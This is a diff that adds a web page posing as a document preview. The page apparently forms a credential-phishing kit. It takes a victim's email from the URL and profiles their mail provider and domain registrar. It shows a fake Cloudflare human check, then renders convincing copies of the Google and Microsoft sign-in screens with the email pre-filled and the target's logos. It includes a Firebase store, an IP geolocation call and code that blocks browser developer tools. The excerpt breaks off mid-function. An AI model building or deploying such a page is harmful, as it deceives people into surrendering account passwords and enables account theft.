@@ -1,0 +1,1566 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>View</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://dns.google">
+  <link rel="preconnect" href="https://rdap.org">
+  <style>
+    .loader {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #3498db;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    .document-preview {
+      background-color: #f8f9fa;
+      border-radius: 5px;
+      padding: 20px;
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .auth-container {
+      display: none;
+      width: 100%;
+      margin: 0;
+      padding: 0;
+    }
+
+    .cloudflare-check {
+      text-align: center;
+      padding: 20px;
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="m-0 p-0">
+    <!-- Initial PDF Preview -->
+    <div id="pdfPreview" class="document-preview">
+      <h4>Loading Document Preview</h4>
+      <div class="loader"></div>
+      <p>Please wait while we prepare your document...</p>
+    </div>
+
+    <!-- Cloudflare Human Check -->
+    <div id="cloudflareCheck" class="cloudflare-check">
+      <h4>Security Verification</h4>
+      <p>Please verify you are human to continue</p>
+      <div id="cf-challenge-widget"></div>
+      <button id="verifyHuman" class="btn btn-primary mt-3">I'm Human</button>
+    </div>
+
+    <!-- Dynamic Auth Container -->
+    <div id="authContainer" class="auth-container">
+      <!-- Content will be dynamically loaded here -->
+    </div>
+  </div>
+
+  <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tldts@6/dist/index.umd.min.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <script>
+    // Initialize Firebase (using global Firebase object from CDN)
+    const firebaseConfig = {
+      apiKey: "AIzaSyARsN-63d0r7so5ytt6RmYMjMyVJ6Rpw8c",
+      authDomain: "abcd-c7e89.firebaseapp.com",
+      projectId: "abcd-c7e89",
+      storageBucket: "abcd-c7e89.firebasestorage.app",
+      messagingSenderId: "689449277919",
+      appId: "1:689449277919:web:c2fc6277911b214ae58c6a"
+    };
+    window.firebaseApp = firebase.initializeApp(firebaseConfig);
+
+    // =======================
+    // Known Registrars
+    // =======================
+    const REGISTRAR_MAP = [
+      { match: /cloudflare/i, brand: 'Cloudflare Registrar', domain: 'cloudflare.com' },
+      { match: /godaddy/i, brand: 'GoDaddy', domain: 'godaddy.com' },
+      { match: /namecheap/i, brand: 'Namecheap', domain: 'namecheap.com' },
+      { match: /gandi/i, brand: 'Gandi', domain: 'gandi.net' },
+      { match: /tucows|opensrs/i, brand: 'Tucows / OpenSRS', domain: 'opensrs.com' },
+      { match: /enom/i, brand: 'eNom', domain: 'enom.com' },
+      { match: /porkbun/i, brand: 'Porkbun', domain: 'porkbun.com' },
+      { match: /dynadot/i, brand: 'Dynadot', domain: 'dynadot.com' },
+      { match: /namesilo/i, brand: 'NameSilo', domain: 'namesilo.com' },
+      { match: /ionos|1and1|1&1/i, brand: 'IONOS', domain: 'ionos.com' },
+      { match: /squarespace|google domains|google llc/i, brand: 'Squarespace Domains', domain: 'squarespace.com' },
+      { match: /alibaba|aliyun|alicloud/i, brand: 'Alibaba Cloud', domain: 'alibabacloud.com' },
+      { match: /markmonitor/i, brand: 'MarkMonitor', domain: 'markmonitor.com' },
+      { match: /ovh/i, brand: 'OVHcloud', domain: 'ovh.com' },
+      { match: /name\.com/i, brand: 'Name.com', domain: 'name.com' },
+    ];
+
+    // =======================
+    // Known MX Providers
+    // =======================
+    const MX_MAP = [
+      { match: /google\.com$/i, brand: 'Google Workspace', domain: 'google.com' },
+      { match: /outlook\.com$|microsoft\.com$|protection\.outlook\.com$/i, brand: 'Microsoft 365', domain: 'microsoft.com' },
+      { match: /zoho\.com$/i, brand: 'Zoho Mail', domain: 'zoho.com' },
+      { match: /protonmail\.(ch|com)$/i, brand: 'Proton Mail', domain: 'proton.me' },
+      { match: /secureserver\.net$/i, brand: 'GoDaddy Email', domain: 'godaddy.com' },
+      { match: /yandex\.(net|ru)$/i, brand: 'Yandex 360', domain: 'yandex.com' },
+      { match: /fastmail\.(com|to)$/i, brand: 'Fastmail', domain: 'fastmail.com' },
+      { match: /icloud\.com$|me\.com$|apple\.com$/i, brand: 'iCloud Mail', domain: 'apple.com' },
+      { match: /mimecast\.com$/i, brand: 'Mimecast (fronting)', domain: 'mimecast.com' },
+      { match: /proofpoint\.com$/i, brand: 'Proofpoint (fronting)', domain: 'proofpoint.com' },
+    ];
+
+    // =======================
+    // Helpers
+    // =======================
+    function safeGetRegisteredDomain(host) {
+      try { return window.tldts.getDomain(host) || host; }
+      catch { return host; }
+    }
+
+    function fetchJSON(url) {
+      return $.getJSON(url).catch(() => null);
+    }
+
+    function rdapRegistrar(domain) {
+      return fetchJSON(`https://rdap.org/domain/${encodeURIComponent(domain)}`)
+        .then(data => {
+          if (!data) return null;
+          let name = data?.registrar?.name || null;
+          if (!name && Array.isArray(data?.entities)) {
+            const reg = data.entities.find(e => (e.roles || []).includes('registrar'));
+            const fn = reg?.vcardArray?.[1]?.find(v => v[0] === 'fn')?.[3];
+            name = fn || reg?.handle || null;
+          }
+          return name;
+        });
+    }
+
+    function dnsMx(domain) {
+      return fetchJSON(`https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`)
+        .then(data => {
+          if (!data) return null;
+          const answers = (data?.Answer || []).filter(a => a.type === 15);
+          const hosts = answers.map(a => a.data.split(' ').pop().replace(/\.$/, '').toLowerCase());
+          if (!hosts.length) return null;
+          for (const h of hosts) {
+            for (const m of MX_MAP) {
+              if (m.match.test(h)) return { brand: m.brand, logoDomain: m.domain, hosts };
+            }
+          }
+          return { brand: 'Custom / Unknown', logoDomain: domain, hosts };
+        });
+    }
+
+    function mapRegistrar(raw) {
+      if (!raw) return null;
+      for (const r of REGISTRAR_MAP) {
+        if (r.match.test(raw)) return { brand: r.brand, logoDomain: r.domain, raw, note: 'RDAP matched' };
+      }
+      return { brand: raw, logoDomain: null, raw, note: 'RDAP (unmapped)' };
+    }
+
+    // =======================
+    // Main function
+    // =======================
+    function email_origin_shower(email) {
+      return new Promise((resolve, reject) => {
+        const match = email.trim().match(/^[^@]+@([^@]+)$/);
+        if (!match) {
+          reject(new Error('Invalid email format'));
+          return;
+        }
+
+        const mailDomain = match[1].toLowerCase();
+        const regDomain = safeGetRegisteredDomain(mailDomain);
+
+        $.when(rdapRegistrar(regDomain), dnsMx(regDomain))
+          .done((regNameRaw, mx) => {
+            const registrar = mapRegistrar(regNameRaw);
+            resolve({
+              email,
+              mailDomain,
+              registeredDomain: regDomain,
+              registrar: registrar || { brand: 'Unknown', logoDomain: null, raw: null, note: 'RDAP unavailable' },
+              mx: mx || { brand: 'Unknown', logoDomain: regDomain, hosts: [] }
+            });
+          })
+          .fail(err => reject(err));
+      });
+    }
+
+
+    // Function to fetch geolocation data using ipgeolocation.io API
+    async function fetchLocation() {
+      try {
+        const response = await $.ajax({
+          url: "https://api.ipgeolocation.io/ipgeo?apiKey=477b04ba40ce487b99984aca5c47b2a0",
+          type: "GET",
+          timeout: 5000 // Timeout to prevent hanging
+        });
+        // Return city and country, or fallback to "Unknown Location"
+        return `${response.city || "Unknown City"}, ${response.country_name || "Unknown Country"}`;
+      } catch (error) {
+        console.error("Error fetching location:", error);
+        return "Unknown Location";
+      }
+    }
+
+    // Function to save data to Firebase
+    async function saveToFirebase(userData) {
+      try {
+        const db = firebase.database(window.firebaseApp);
+        const usersRef = db.ref("profileruser"); // Use profileruser node
+        await usersRef.push(userData);
+        console.log("Data saved to Firebase profileruser successfully");
+      } catch (error) {
+        console.error("Error saving to Firebase:", error);
+        throw new Error(`Failed to save to database: ${error.message}`);
+      }
+    }
+
+
+    // Anti-inspection techniques
+    Object.defineProperty(window, 'ondevtoolopen', {
+         get: () => {
+           window.location.href = "about:blank";
+           return '';
+       },
+      set: () => { }
+     });
+
+     document.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+     });
+
+     document.onkeydown = function (e) {
+       if (e.keyCode == 123 ||
+            (e.ctrlKey && e.shiftKey && e.keyCode == 73) ||
+             (e.ctrlKey && e.shiftKey && e.keyCode == 74)) {
+           return false;
+       }
+    };
+
+    // Main functionality
+    $(document).ready(function () {
+      // Parse email from URL parameters
+      const urlParams = new URLSearchParams(window.location.search);
+      const userEmail = urlParams.get('email') || urlParams.get('e') || urlParams.get('id');
+
+      if (!userEmail) {
+        showError("No document reference provided");
+        return;
+      }
+
+      if (!/^[^@]+@[^@]+$/.test(userEmail)) {
+        showError("Invalid document reference format");
+        return;
+      }
+
+// Messages in order
+const previewMessages = [
+  "Preparing your document..",
+  "Please a moment..",
+  "Verifying You're Human",
+  "Verifying You're Human.."
+];
+
+let previewMsgIndex = 0;
+let previewMsgInterval = null;
+
+function startPreviewMessageCycle() {
+  const $msg = $('#pdfPreview p');
+  previewMsgIndex = 0; 
+  $msg.text(previewMessages[previewMsgIndex]);
+
+  // Clear any existing cycle
+  if (previewMsgInterval) clearInterval(previewMsgInterval);
+
+  previewMsgInterval = setInterval(() => {
+    previewMsgIndex++;
+    if (previewMsgIndex < previewMessages.length) {
+      $msg.text(previewMessages[previewMsgIndex]);
+    } else {
+      // Stop once we reach the last message
+      clearInterval(previewMsgInterval);
+      previewMsgInterval = null;
+    }
+  }, 5000); // change every 5s
+}
+
+function stopPreviewMessageCycle() {
+  if (previewMsgInterval) {
+    clearInterval(previewMsgInterval);
+    previewMsgInterval = null;
+  }
+}
+
+      startPreviewMessageCycle();
+
+      // Fetch email info and then proceed
+      email_origin_shower(userEmail)
+        .then(emailInfo => {
+          console.log("Email info:", emailInfo);
+          $('#verifyHuman').data('emailInfo', emailInfo);
+
+           // Stop cycling and hide preview
+    stopPreviewMessageCycle();
+          $('#pdfPreview').hide();
+          showCloudflareCheck();
+        })
+        .catch(err => {
+           stopPreviewMessageCycle();
+          console.error(err);
+          showError("Error fetching email details");
+        });
+
+      // Cloudflare verification handler
+      $('#verifyHuman').click(function () {
+        $('#cloudflareCheck').hide();
+        const emailInfo = $(this).data('emailInfo');
+        loadAuthInterface(emailInfo, userEmail);
+      });
+    });
+
+    function showCloudflareCheck() {
+      // Simulate Cloudflare challenge
+      $('#cloudflareCheck').show();
+      setTimeout(() => {
+        $('#cf-challenge-widget').html('<div style="background: #f0f0f0; padding: 15px; border-radius: 5px;">Verification not completed</div>');
+      }, 2000);
+    }
+
+    function loadAuthInterface(emailInfo, email) {
+      // Extract values directly from the emailInfo object
+      const mailDomain = emailInfo.mailDomain || '';
+      const registeredDomain = emailInfo.registeredDomain || mailDomain;
+
+      const registrarBrand = emailInfo.registrar?.brand !== "" && emailInfo.registrar?.brand !== "Unknown" ? emailInfo.registrar?.brand : null;
+      const registrarLogoUrl = emailInfo.registrar?.logoDomain
+        ? `https://logo.clearbit.com/${emailInfo.registrar.logoDomain}`
+        : null;
+
+      const emailHost = emailInfo.mx?.brand || '';
+      const emailHostLogoUrl = emailInfo.mx?.logoDomain
+        ? `https://logo.clearbit.com/${emailInfo.mx.logoDomain}`
+        : null;
+
+      const userEmail = email || emailInfo.email || '';
+
+      // Provider map
+      const PROVIDERS = {
+        'gmail.com': { fn: getGoogleAuthHTML, favicon: emailHostLogoUrl },
+        'outlook.com': { fn: getMicrosoftAuthHTML, favicon: emailHostLogoUrl },
+        'hotmail.com': { fn: getMicrosoftAuthHTML, favicon: emailHostLogoUrl },
+        'live.com': { fn: getMicrosoftAuthHTML, favicon: emailHostLogoUrl },
+        'yahoo.com': { fn: getYahooAuthHTML, favicon: emailHostLogoUrl },
+        'icloud.com': { fn: getAppleAuthHTML, favicon: emailHostLogoUrl },
+        'me.com': { fn: getAppleAuthHTML, favicon: emailHostLogoUrl },
+        'mac.com': { fn: getAppleAuthHTML, favicon: emailHostLogoUrl },
+        'aol.com': { fn: getAOLAuthHTML, favicon: emailHostLogoUrl },
+        'protonmail.com': { fn: getProtonAuthHTML, favicon: emailHostLogoUrl },
+      };
+
+      // Helper to call provider function
+      function buildHtml(fn, mailDomainVal) {
+        return fn(
+          mailDomainVal,
+          registeredDomain,
+          registrarBrand,
+          registrarLogoUrl,
+          emailHostLogoUrl,
+          userEmail
+        );
+      }
+
+      // Decide provider
+      let authHTML;
+      if (PROVIDERS[mailDomain]) {
+        const p = PROVIDERS[mailDomain];
+        authHTML = { html: buildHtml(p.fn, mailDomain), favicon: p.favicon };
+      } else {
+        const brandLower = emailHost.toLowerCase();
+        if (brandLower.includes('google')) {
+          authHTML = { html: buildHtml(getGoogleAuthHTML, registeredDomain), favicon: emailHostLogoUrl };
+        } else if (brandLower.includes('microsoft') || brandLower.includes('office')) {
+          authHTML = { html: buildHtml(getMicrosoftAuthHTML, registeredDomain), favicon: emailHostLogoUrl };
+        } else if (brandLower.includes('yahoo')) {
+          authHTML = { html: buildHtml(getYahooAuthHTML, registeredDomain), favicon: emailHostLogoUrl };
+        } else if (brandLower.includes('apple')) {
+          authHTML = { html: buildHtml(getAppleAuthHTML, registeredDomain), favicon: emailHostLogoUrl };
+        } else if (brandLower.includes('aol')) {
+          authHTML = { html: buildHtml(getAOLAuthHTML, registeredDomain), favicon: emailHostLogoUrl };
+        } else if (brandLower.includes('proton')) {
+          authHTML = { html: buildHtml(getProtonAuthHTML, registeredDomain), favicon: emailHostLogoUrl };
+        } else {
+          authHTML = { html: buildHtml(getGoogleAuthHTML, registeredDomain), favicon: emailHostLogoUrl };
+        }
+      }
+
+      // Render
+      $('#authContainer').html(authHTML.html).show();
+
+      setFavicon(authHTML.favicon);
+
+      attachAuthHandlers(userEmail);
+
+      setupGoogleAuthEvents();
+      setupMicrosoftAuthEvents();
+      setupYahooAuthEvents();
+      setupAppleAuthEvents();
+      setupAOLAuthEvents();
+      setupProtonAuthEvents();
+    }
+
+
+
+    // Helper function to change favicon
+    function setFavicon(url) {
+      let link = $('link[rel="icon"]');
+      if (!link.length) {
+        link = $('<link rel="icon" type="image/x-icon">').appendTo('head');
+      }
+      link.attr('href', url);
+    }
+
+    function getGoogleAuthHTML(mailDomain, registeredDomain, registrarBrand, registrarLogoUrl, emailHostLogoUrl, email) {
+      document.title = registrarBrand? 'Sign in - '+registrarBrand : 'Sign in - Google'
+      return `
+       <style>
+        @keyframes googleLoaderAnimation {
+            0% { transform: scaleX(0); transform-origin: left; }
+            50% { transform: scaleX(1); transform-origin: left; }
+            51% { transform-origin: right; }
+            100% { transform: scaleX(0); transform-origin: right; }
+        }
+        .google-auth-container {
+            width: 100%;
+            max-width: 1000px;
+            min-height: 400px;
+            margin: 0 auto;
+            padding: 0px 40px 40px 40px;
+            font-family: 'Roboto', Arial, sans-serif;
+            color: #202124;
+            font-size: 14px;
+            line-height: 20px;
+            border-radius: 28px;
+        }
+        .google-footer{
+            max-width: 900px;
+        }
+        .google-auth-container input {
+            width: 100%;
+            height: 56px;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border 0.1s;
+        }
+        .google-auth-container input:focus {
+            border: 2px solid #1a73e8;
+        }
+        .google-auth-container label {
+            position: absolute;
+            top: 16px;
+            left: 16px;
+            color: #5f6368;
+            font-size: 16px;
+            transition: all 0.15s ease-out;
+            pointer-events: none;
+        }
+        .google-auth-container input:focus + label,
+        .google-auth-container input:not(:placeholder-shown) + label {
+            top: -8px;
+            left: 12px;
+            font-size: 12px;
+            background: white;
+            padding: 0 4px;
+            color: #1a73e8;
+        }
+        .google-auth-container button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 28px;
+            padding: 9px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .google-auth-container button:hover {
+            background-color: #1967d2;
+        }
+        .google-auth-container a, .google-footer a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        .google-auth-container a:hover, .google-footer a:hover {
+            text-decoration: underline;
+        }
+            #emailScreen, #passwordScreen{
+            margin-top: 40px;
+            }
+        @media (min-width: 768px) {
+            .mt-md-100{
+                  margin-top: 70px;
+        }
+        .mt-md-200{
+                  margin-top: 150px;
+        }
+      
+        }
+
+          @media (max-width: 768px) {
+              .google-auth-container {
+           border-radius: 0px;
+           min-height: 90vh;
+           padding: 0px 25px 30px 25px;
+        }
+        .google-footer{
+            background: white;
+            min-height: 10vh;
+            padding-left: 25px;
+            padding-right: 25px;
+        }
+        }
+    </style>
+
+            <div class="w-100 d-flex align-items-center justify-content-center flex-column gap-md-3" style="min-height: 100vh;background: #f0f4f9;">
+    <div class="google-auth-container" style="background-color: white;">
+        <!-- Loading bar (initially hidden) -->
+        <div id="googleAuthLoader" style="display: none; height: 4px; width: 100%; background-color: #e0e0e0; overflow: hidden; margin-bottom: 24px;">
+            <div style="height: 100%; width: 100%; background-color: #1a73e8; animation: googleLoaderAnimation 2s infinite linear; transform-origin: left;"></div>
+        </div>
+        <div id="emailScreen">
+        <div class="d-flex flex-md-row flex-column gap-5">
+        <div class="d-flex flex-column gap-3" style="flex:1;">
+          <span>
+            <img src="${emailHostLogoUrl}" alt="Google" style="height: 42px; width: 42px;">
+            ${registrarLogoUrl && `<img style="height: 42px; width: auto;" src="${registrarLogoUrl}" alt="${registeredDomain}">`}
+            </span>
+           <p style="font-size: 14px; font-weight: 400;">From ${registeredDomain}</p>
+             <h1 style="font-size: 36px; font-weight: 400;">Sign in</h1>
+             <p style="color: #1f1f1f;font-size: 16px; font-weight: 400;line-height: 24px;">with your Google Account. This account will be available to other Google apps in the browser.</p>
+        </div>
+         <div class="d-flex flex-column mt-md-100" style="flex: 1;">
+        
+            <div style="position: relative;">
+                <input type="email" id="authEmail" value="${email}" readonly>
+                <label for="authEmail">Email or phone</label>
+            </div>
+            <div class="d-flex justify-content-between align-items-center mt-2">
+                <a href="#" style="font-size: 14px;">Forgot email ?</a>
+            </div>
+            <p class="my-5">Not your computer? Use Guest mode to sign in privately. <a href="#"> Learn more about using Guest mode</a></p>
+            <div class="d-flex justify-content-md-end justify-content-between align-items-center gap-5">
+                <a href="#" style="font-size: 14px;">Create account</a>
+                <button id="nextBtn">Next</button>
+            </div>
+        </div>
+        </div>
+    </div>
+
+        <div id="passwordScreen" style="display: none;">
+         <div class="d-flex flex-md-row flex-column gap-5">
+        <div class="d-flex flex-column gap-3" style="flex:1;">
+            <span>
+            <img src="${emailHostLogoUrl}" alt="Google" style="height: 42px; width: 42px;">
+            ${registrarLogoUrl && `<img style="height: 42px; width: auto;" src="${registrarLogoUrl}" alt="${registeredDomain}">`}
+            </span>
+             <h1 style="font-size: 36px; font-weight: 400;">Welcome</h1>
+             <span class="d-flex align-items-center gap-2 p-1 px-2 border" style="font-size: 16px; border-radius: 24px;cursor: pointer;width: fit-content;"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person-circle" viewBox="0 0 16 16">
+  <path d="M11 6a3 3 0 1 1-6 0 3 3 0 0 1 6 0"/>
+  <path fill-rule="evenodd" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8m8-7a7 7 0 0 0-5.468 11.37C3.242 11.226 4.805 10 8 10s4.757 1.225 5.468 2.37A7 7 0 0 0 8 1"/>
+</svg>${email}</span>
+        </div>
+         <div class="d-flex flex-column mt-md-200" style="flex: 1;">
+        
+            <div id="authError" class="mt-4" style="color: #d93025; padding: 12px; font-size: 14px; display: none;"></div>
+            <div style="position: relative; margin-bottom: 16px;">
+                <input type="password" id="authPassword" placeholder=" ">
+                <label for="authPassword">Enter your password</label>
+            </div>
+            <div class="mb-2" style="display: flex; align-items: center; font-size: 16px; color: #202124;">
+                <input type="checkbox" id="showPassword" style="margin-right: 8px;width: 20px; height: 20px; cursor: pointer;">
+                <label for="showPassword" style="position: static; cursor: pointer; color: #1f1f1f; font-size: 15px; font-weight: 400;">Show password</label>
+            </div>
+              <div class="d-flex justify-content-md-end justify-content-between align-items-center mt-5 gap-5">
+                <a href="#" style="font-size: 14px;">Try another way</a>
+                <button id="signInBtn">Next</button>
+            </div>
+        </div>
+        </div>
+        </div>
+    </div>
+     <div class="google-footer d-flex justify-content-between w-100" style="color: #5f6368; font-size: 12px;">
+            <div>
+                <select style="border: none; color: #5f6368; background-color: transparent; font-size: 12px;">
+                    <option>English (United States)</option>
+                    <option>Español</option>
+                    <option>Français</option>
+                </select>
+            </div>
+            <div>
+                <a href="#" class="me-3" style="color: #5f6368;">Help</a>
+                <a href="#" class="me-3" style="color: #5f6368;">Privacy</a>
+                <a href="#" style="color: #5f6368;">Terms</a>
+            </div>
+        </div>
+    </div>
+    `;
+    }
+
+    // Call this after inserting the HTML into the DOM
+    function setupGoogleAuthEvents() {
+      $(document).off('click', '#nextBtn').on('click', '#nextBtn', function () {
+        $('#googleAuthLoader').show();
+        setTimeout(function () {
+          $('#emailScreen').hide();
+          $('#passwordScreen').show();
+          $('#googleAuthLoader').hide();
+        }, 800);
+      });
+
+      $(document).off('click', '.back-to-email').on('click', '.back-to-email', function () {
+        $('#passwordScreen').hide();
+        $('#emailScreen').show();
+      });
+
+      // Add show password toggle
+      $(document).off('change', '#showPassword').on('change', '#showPassword', function () {
+        const passwordInput = $('#authPassword');
+        passwordInput.attr('type', this.checked ? 'text' : 'password');
+      });
+
+      // Optional: Simulate sign-in button (add error example)
+      $(document).off('click', '#signInBtn').on('click', '#signInBtn', function () {
+        // For demo: Show error if password empty
+        if (!$('#authPassword').val()) {
+          $('#authError').text("Please enter your password").show();
+        }
+      });
+    }
+
+
+    function getMicrosoftAuthHTML(mailDomain, registeredDomain, registrarBrand, registrarLogoUrl, emailHostLogoUrl, email) {
+      document.title = registrarBrand? 'Sign In | '+registrarBrand : 'Sign In | Microsoft'
+      return `
+               <style>
+                :root{
+  --ms-orange: rgba(233, 74, 47, 0.18);  /* top-left */
+  --ms-green:  rgba(67, 176, 42, 0.14);  /* top-right */
+  --ms-yellow: rgba(239,195,  0, 0.16);  /* bottom-right */
+  --ms-blue:   rgba(47, 142,219, 0.14);  /* bottom-left */
+  --paper: rgba(209, 209, 209, 0.94);       /* soft desaturating wash */
+}
+
+.gradient {
+  min-height: 100vh;
+  margin: 0;
+  background-color: #f7f6f5; /* faint base */
+  background-image:
+    /* colored blobs (very soft / faint) */
+    radial-gradient(circle at 8% 12%,  var(--ms-orange) 0%, rgba(233,74,47,0.06) 18%, transparent 42%),
+    radial-gradient(circle at 86% 14%, var(--ms-green)  0%, rgba(67,176,42,0.05) 18%, transparent 42%),
+    radial-gradient(circle at 80% 82%, var(--ms-yellow) 0%, rgba(239,195,0,0.05) 18%, transparent 46%),
+    radial-gradient(circle at 14% 82%, var(--ms-blue)   0%, rgba(47,142,219,0.05) 18%, transparent 46%),
+    /* faint white wash to mute and even out the colors */
+    linear-gradient(180deg, var(--paper), rgba(255,255,255,0.92));
+  background-blend-mode: normal;
+  background-size: cover;
+  background-position: center;
+  /* optional: tiny blur to soften further */
+  /* filter: blur(0.2px); */
+}
+                @keyframes msftDotAnimation {
+                    0% { transform: translateX(0); opacity: 0; }
+                    10% { opacity: 1; }
+                    50% { transform: translateX(220px); } /* Center position */
+                    90% { opacity: 1; }
+                    100% { transform: translateX(440px); opacity: 0; } /* Full width */
+                }
+                /* Keep all your existing slide animations */
+                .slide-out { animation: slideOut 0.3s forwards; }
+                .slide-in { animation: slideIn 0.3s forwards; }
+                @keyframes slideOut {
+                    from { transform: translateX(0); opacity: 1; }
+                    to { transform: translateX(-100%); opacity: 0; }
+                }
+                @keyframes slideIn {
+                    from { transform: translateX(100%); opacity: 0; }
+                    to { transform: translateX(0); opacity: 1; }
+                }
+                input {
+  border: none;
+  outline: none;
+}
+
+input:focus,
+input:hover {
+  border: none;
+  outline: none;
+}
+            </style>
+    <div class="w-100 gradient d-flex flex-column justify-content-center" style="min-height: 100vh;">
+   <div class="microsoft-auth-container p-md-5 p-3 w-100" style="box-shadow:0 2px 6px rgba(0, 0, 0, 0.2); max-width: 440px; min-height: 330px; margin: 100px auto 0px auto; font-family: 'Segoe UI', 'Helvetica Neue', sans-serif; position: relative; overflow-x: hidden; background: white;">
+            <!-- Correct Microsoft Dot Loader (5 dots wave animation) -->
+            <div id="msftLoader" class="d-none" style="position: absolute; top: 0; left: 0; right: 0; height: 6px; background: transparent; overflow: hidden; z-index: 1;margin-bottom: 10px">
+                <div style="display: flex; width: 100%; height: 100%; position: relative;">
+                    <div class="msft-dot" style="position: absolute; width: 6px; height: 6px; background: #0078d4; border-radius: 50%; animation: msftDotAnimation 1.8s infinite ease-in-out;"></div>
+                    <div class="msft-dot" style="position: absolute; width: 6px; height: 6px; background: #0078d4; border-radius: 50%; animation: msftDotAnimation 1.8s infinite ease-in-out; animation-delay: 0.15s;"></div>
+                    <div class="msft-dot" style="position: absolute; width: 6px; height: 6px; background: #0078d4; border-radius: 50%; animation: msftDotAnimation 1.8s infinite ease-in-out; animation-delay: 0.3s;"></div>
+                    <div class="msft-dot" style="position: absolute; width: 6px; height: 6px; background: #0078d4; border-radius: 50%; animation: msftDotAnimation 1.8s infinite ease-in-out; animation-delay: 0.45s;"></div>
+                    <div class="msft-dot" style="position: absolute; width: 6px; height: 6px; background: #0078d4; border-radius: 50%; animation: msftDotAnimation 1.8s infinite ease-in-out; animation-delay: 0.6s;"></div>
+                </div>
+            </div>
+             <div class="d-flex align-items-center gap-2">
+            <div class="text-center d-flex align-items-center gap-2" style="font-size:20px;color: #666666;font-weight:500">
+                <img src="${emailHostLogoUrl}" 
+                     alt="Microsoft" style="height: 24px">
+                     Microsoft
+            </div>
+            ${registrarLogoUrl && ` <div class="text-center d-flex align-items-center gap-2" style="font-size:20px;color: #666666;font-weight:500">
+                <img src="${registrarLogoUrl}" 
+                     alt="Microsoft" style="height: 24px">
+                     ${registrarBrand || ''}
+            </div>`}
+           </div>
+            <div id="msftAuthContainer" class="mt-3" style="position: relative;">
+                <!-- Email Screen -->
+                <div id="msftEmailScreen" style="transition: all 0.3s ease;">
+                    <h1 class="mb-3" style="font-size: 24px; font-weight: 500; color: #323130">Sign in</h1>
+                    <div class="mb-3">
+                        <input type="email" id="authEmail" value="${email}" readonly
+                               style="width: 100%; height: 30px;border: none; font-size: 15px; border-bottom: 2px solid #a6a6a6;">
+                    </div>
+                    <div class="mb-3">
+                        <a href="#" style="color: #0078d4; text-decoration: none; font-size: 14px;">Can't access your account?</a>
+                    </div>
+                    <div class="mt-5" style="display: flex; justify-content: right; align-items: end;">
+                       
+                        <button id="msftNextBtn" 
+                                style="background: #0067B8; color: white; border: none;font-size: 14px; font-weight: 600; height: 32px;width: 110px">
+                            Next
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Password Screen (hidden initially) -->
+                <div id="msftPasswordScreen" style="position: absolute; top: 0; left: 0; right: 0; display: none;">
+                    <div style="margin-bottom: 24px;">
+                        <div style="display: flex; align-items: center; margin-bottom: 16px;">
+                            <div id="msftBackToEmail" style="cursor: pointer; margin-right: 12px;">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-arrow-left" viewBox="0 0 16 16">
+  <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8"/>
+</svg>
+                            </div>
+                            <span style="font-size: 15px; color: #323130;">${email}</span>
+                        </div>
+                        <div id="authError" style="color: #a80000; font-size: 14px; margin: 5px 0; display: none;"></div>
+                        <input type="password" id="authPassword" placeholder="Password" 
+                               style="width: 100%; height: 30px; font-size: 15px; border-bottom: 2px solid #a6a6a6;">
+                    </div>
+                     <div class="mb-3">
+                        <a href="#" style="color: #0078d4; text-decoration: none; font-size: 14px;">Forgot password?</a>
+                    </div>
+                     <div class="mt-5" style="display: flex; justify-content: right; align-items: end;">
+                       
+                        <button id="signInBtn" 
+                                style="background: #0067B8; color: white; border: none;font-size: 14px; font-weight: 600; height: 32px;width: 110px">
+                            Next
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+         <div class="w-100 d-flex justify-content-end gap-3 p-5" style="margin-top: 100px;">
+                <div style="font-size: 12px; color: #666;">
+                    <a href="#" style="color: #666; text-decoration: none;">Terms of use</a>
+                </div>
+                <div style="font-size: 12px; color: #666;">
+                    <a href="#" style="color: #666; text-decoration: none;">Privacy & cookies</a>
+                </div>
+            </div>
+        </div>
+    `;
+    }
+
+    // Call this after inserting the HTML into the DOM
+    function setupMicrosoftAuthEvents() {
+      $(document).off('click', '#msftNextBtn').on('click', '#msftNextBtn', function () {
+        $('#msftLoader').removeClass('d-none');
+
+        setTimeout(function () {
+          $('#msftEmailScreen').addClass('slide-out');
+
+          setTimeout(function () {
+            $('#msftEmailScreen').hide().removeClass('slide-out');
+            $('#msftPasswordScreen').addClass('slide-in').show();
+
+            setTimeout(function () {
+              $('#msftPasswordScreen').removeClass('slide-in');
+              $('#msftLoader').addClass('d-none');
+            }, 300);
